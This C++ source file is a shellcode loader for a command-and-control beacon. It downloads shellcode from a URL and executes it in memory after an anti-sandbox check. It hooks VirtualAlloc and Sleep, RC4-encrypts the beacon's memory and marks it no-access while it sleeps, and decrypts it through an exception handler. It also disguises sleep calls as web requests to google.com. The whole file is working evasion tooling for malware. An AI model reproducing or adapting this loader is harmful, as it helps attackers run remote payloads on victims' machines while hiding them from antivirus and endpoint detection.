#include "..\..\Public.hpp"
#include "minhook\MinHook.h"

#pragma comment(lib, "libMinHook-x64-v141-mt.lib")

LPVOID Beacon_address;
SIZE_T Beacon_data_len;
DWORD Beacon_Memory_address_flOldProtect;
HANDLE hEvent;

BOOL Vir_FLAG = TRUE;
LPVOID shellcode_addr;

std::string Rc4_Random_Key;

typedef NTSTATUS(WINAPI* _SystemFunction033)(
	struct ustring* memoryRegion,
	struct ustring* keyPointer);

struct ustring {
	DWORD Length;
	DWORD MaximumLength;
	PUCHAR Buffer;
} beacon_data, beacon_key;

_SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibrary(L"advapi32"), "SystemFunction033");



template <typename T>
inline MH_STATUS MH_CreateHookEx(LPVOID pTarget, LPVOID pDetour, T** ppOriginal)
{
	return MH_CreateHook(pTarget, pDetour, reinterpret_cast<LPVOID*>(ppOriginal));
}

template <typename T>
inline MH_STATUS MH_CreateHookApiEx(
	LPCWSTR pszModule, LPCSTR pszProcName, LPVOID pDetour, T** ppOriginal)
{
	return MH_CreateHookApi(
		pszModule, pszProcName, pDetour, reinterpret_cast<LPVOID*>(ppOriginal));
}

void GoogleSleep(DWORD dwMilliseconds)
{
	// init curl  
	CURL* curl = curl_easy_init();
	// res code  
	CURLcode res;
	if (curl)
	{
		// set params  
		curl_easy_setopt(curl, CURLOPT_URL, "https://www.google.com/"); // url  
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, false); // if want to use https  
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, false); // set peer and host verify false 
		curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, dwMilliseconds);
		// start req  
		res = curl_easy_perform(curl);
	}
	// release curl  
	curl_easy_cleanup(curl);
}

std::string genRandomRC4Key() 
{
	srand((unsigned)time(NULL));
	std::string str = "";
	for (int i = 1; i <= 20; i++)
	{
		int flag;
		flag = rand() % 2;
		if (flag == 1)
			str += rand() % ('Z' - 'A' + 1) + 'A';
		else
			str += rand() % ('z' - 'a' + 1) + 'a';

	}
	return str;
}

static LPVOID(WINAPI* OldVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
LPVOID WINAPI NewVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
	Beacon_data_len = dwSize;
	Beacon_address = OldVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
	printf("VirtualSize of Beacon:%d \n", Beacon_data_len);
	printf("VirtualAddress of Beacon:%llx \n", Beacon_address);
	return Beacon_address;
}

static VOID(WINAPI* OldSleep)(DWORD dwMilliseconds);
void WINAPI NewSleep(DWORD dwMilliseconds)
{
	if (Vir_FLAG)
	{
		VirtualFree(shellcode_addr, 0, MEM_RELEASE);
		Vir_FLAG = false;
	}
	printf("sleep time:%d\n", dwMilliseconds);
	SetEvent(hEvent);
//	OldSleep(dwMilliseconds);
//	WaitForSingleObject(GetCurrentProcess(), dwMilliseconds);
	GoogleSleep(dwMilliseconds);
}

void Hook()
{
	MH_CreateHookApiEx(L"kernel32.dll", "VirtualAlloc", &NewVirtualAlloc, &OldVirtualAlloc);
	MH_CreateHookApiEx(L"kernel32.dll", "Sleep", &NewSleep, &OldSleep);
	MH_EnableHook(MH_ALL_HOOKS);
}

void UnHook()
{
	MH_DisableHook(&OldVirtualAlloc);
	MH_RemoveHook(&OldVirtualAlloc);
}

BOOL is_Exception(DWORD64 Exception_addr)
{
	if (Exception_addr < ((DWORD64)Beacon_address + Beacon_data_len) && Exception_addr >(DWORD64)Beacon_address)
	{
		printf("Address Match:%llx\n", Exception_addr);
		return true;
	}
	printf("Address Not Match:%llx\n", Exception_addr);
	return false;
}

LONG NTAPI FirstVectExcepHandler(PEXCEPTION_POINTERS pExcepInfo)
{
	printf("FirstVectExcepHandler\n");
	printf("Exception Code:%x\n", pExcepInfo->ExceptionRecord->ExceptionCode);
	printf("Thread Address:%llx\n", pExcepInfo->ContextRecord->Rip);
	if (pExcepInfo->ExceptionRecord->ExceptionCode == 0xc0000005 && is_Exception(pExcepInfo->ContextRecord->Rip))
	{
		printf("Resume Memory.\n");
		VirtualProtect(Beacon_address, Beacon_data_len, PAGE_EXECUTE_READWRITE, &Beacon_Memory_address_flOldProtect);

		printf("Decrypt Beacon Mem\n");

		beacon_key.Buffer = (PUCHAR)(&Rc4_Random_Key);
		beacon_key.Length = sizeof beacon_key;
		beacon_data.Buffer = (PUCHAR)Beacon_address;
		beacon_data.Length = Beacon_data_len;

		SystemFunction033(&beacon_data, &beacon_key);

		return EXCEPTION_CONTINUE_EXECUTION;
	}
	return EXCEPTION_CONTINUE_SEARCH;
}

DWORD WINAPI Beacon_set_Memory_attributes(LPVOID lparam)
{
	printf("Beacon_set_Memory_attributes Start\n");
	while (true)
	{
		WaitForSingleObject(hEvent, INFINITE);

		Rc4_Random_Key = genRandomRC4Key();

		printf("Random RC4 Key is %s\n", Rc4_Random_Key);

		beacon_key.Buffer = (PUCHAR)(&Rc4_Random_Key);
		beacon_key.Length = sizeof beacon_key;
		beacon_data.Buffer = (PUCHAR)Beacon_address;
		beacon_data.Length = Beacon_data_len;

		printf("Encrypt Beacon Mem\n");
		SystemFunction033(&beacon_data, &beacon_key);

		printf("Set Memory NOACCESS.\n");
		VirtualProtect(Beacon_address, Beacon_data_len, PAGE_NOACCESS, &Beacon_Memory_address_flOldProtect);
		ResetEvent(hEvent);
	}
	return 0;
}

void runShellcode()
{
	std::string shellcode = GetShellcodeFromUrl();

	if (shellcode.size() > 0)
	{
		MH_Initialize();
		hEvent = CreateEvent(NULL, TRUE, false, NULL);

		AddVectoredExceptionHandler(1, &FirstVectExcepHandler);
		Hook();
		HANDLE hThread1 = CreateThread(NULL, 0, Beacon_set_Memory_attributes, NULL, 0, NULL);
		CloseHandle(hThread1);

		DWORD oldProtect = NULL;
		shellcode_addr = VirtualAlloc(NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		mc(shellcode_addr, shellcode.c_str(), shellcode.size());
		VirtualProtect(shellcode_addr, shellcode.size(), PAGE_EXECUTE_READ, &oldProtect);
		((void(*)())shellcode_addr)();

		UnHook();
	}
}

int main()
{
	antiSandbox();
	runShellcode();
	return 0;
}